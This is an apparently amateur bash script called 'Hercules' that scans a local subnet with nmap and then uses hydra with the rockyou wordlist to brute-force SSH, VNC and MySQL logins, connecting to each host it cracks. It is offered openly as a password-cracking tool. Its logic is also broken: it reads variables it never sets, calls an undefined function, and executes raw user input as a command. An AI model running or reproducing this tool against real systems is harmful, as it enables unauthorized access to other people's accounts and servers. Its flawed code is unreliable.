#!/bin/bash

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# OS of the computer
OS="linux"

# For the wget functionality to work
SITE_URL="https://google.com"

# Root user
root=0

empty=("")

# The yes array that contains the yes input
yes=("yes" "YES" "y" "Y")

# The array that contains the exit input
exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")

# Gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

# List of required packages/commands (separated by spaces)
required_packages=("wget" "nmap" "hydra" "ssh" "mysql")

# Function to check if a command exists
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Function to display an error message and exit
display_error() {
  echo -e "${RED}ERROR:${NC} $1"
  exit 1
}

# Function to display a help message
display_help() {
  figlet "? HELP ?"
  echo
  echo "+++++++++++++++Programs used+++++++++++++++"
  echo "This program will help you crack passwords"
  echo "It has two programs inside it, one is Hydra and the other is Nmap"
  echo
  echo "+++++++++++++++How to use++++++++++++++++++"
  echo "To use the program, enter the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'."
  echo "If you want to stop the program, type 'stop'."
  echo
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
  display_error "Please run as root."
fi

# Check for required packages
for package in "${required_packages[@]}"; do
  if ! command_exists "$package"; then
    display_error "The required package '$package' is not installed or not in the system path. Please install it and try again."
  fi
done

# Check if the script is run with --help or -h
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
  display_help
else
  if [[ "$OSTYPE" == "${OS}"* ]]; then
    clear
    if [[ $EUID -ne $root ]]; then
      # Error message if not running as root
      echo "ERROR:root:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
      echo "TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
      exit
    else
      # Check internet connectivity
      wget -q --spider $SITE_URL
      if [[ $? -ne 0 ]]; then
        display_error "You are offline. Please connect to the internet."
      fi

      # Clear the terminal
      clear

      # Function to perform port scanning and password cracking
      Hercules() {
        figlet -f slant "Hercules"
        echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'."
        echo "If you want to stop the program, type 'stop'."
        read -p ">>> " service

        if [[ $service == "ALL" || $service == "all" ]]; then
          # Scan the entire network and display open ports
          echo -e "${RED}This can take up to 1 hour to complete.${NC}"
          sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
          hydra -h
          echo "Put in Hydra first to start the script."
          echo ""
          read -p ">>> " Hydra

          if [[ " ${exit[*]} " == *" $Hydra "* ]]; then
            echo "Goodbye"
            exit
          else
            $Hydra
            exit
          fi
        elif [[ " ${exit[*]} " == *" $service "* ]]; then
          echo "Stopping program..."
          sleep 1
          exit
        elif ! [[ "$service" =~ ^[0-9]+$ ]]; then
          display_error "Please input a valid number."
        else
          # Scan specific port
          sudo nmap -sS 192.168.1.1/24 -p $service --open
        fi
      }

      # Function to run password cracking for VNC
      RunHackingCommandWithVNC() {
        if [[ $service == 5900 || $service == "VNC" ]]; then
          if [[ $user == "" && $host == "" || $host == "" ]]; then
            display_error "No service specified."
          else
            # Crack VNC password
            hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
            title="Connecting to ${user}"
            Connecting_To_VNC_SERVER="We are connecting you to ${user}. Please wait..."
            zenity --info --title="${title}" --text="${Connecting_To_VNC_SERVER}"
            sleep 5
            title="Enter password to ${user}"
            Connected_To_VNC_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
            zenity --info --title="${title}" --text="${Connected_To_VNC_SERVER}"
            echo "Loading VNC server..."
            open vnc://$host
            exit
          fi
        fi
      }

      # Function to run password cracking for SSH
      RunHackingCommandWithSSH() {
        if [[ $service == 22 || $service == "ssh" ]]; then
          if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
            display_error "No service specified."
          else
            # Crack SSH password
            hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
            title="Connecting to ${user}"
            Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
            zenity --info --title="${title}" --text="${Connecting_To_SSH_SERVER}"
            sleep 5
            title="Enter password to ${user}"
            Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
            zenity --info --title="${title}" --text="${Connected_To_SSH_SERVER}"
            ssh $user@$host
          fi
        fi
      }

      # Function to run password cracking for MySQL
      RunHackingCommandWithMySQL() {
        if [[ $service == 3306 || $service == "mysql" ]]; then
          if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
            display_error "No service specified."
          else
            # Crack MySQL password
            hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
            echo "Loading MySQL server..."
            sleep 3
            mysql -u $user -p -A
          fi
        fi
      }

      # Initial call to Hercules function
      Hercules

      # Call password cracking functions
      RunHackingCommand
      RunHackingCommandWithVNC
      RunHackingCommandWithSSH
      RunHackingCommandWithMySQL
    fi
  else
    # Warning message for wrong OS
    display_error "Wrong OS. Please use the correct OS."
  fi
fi
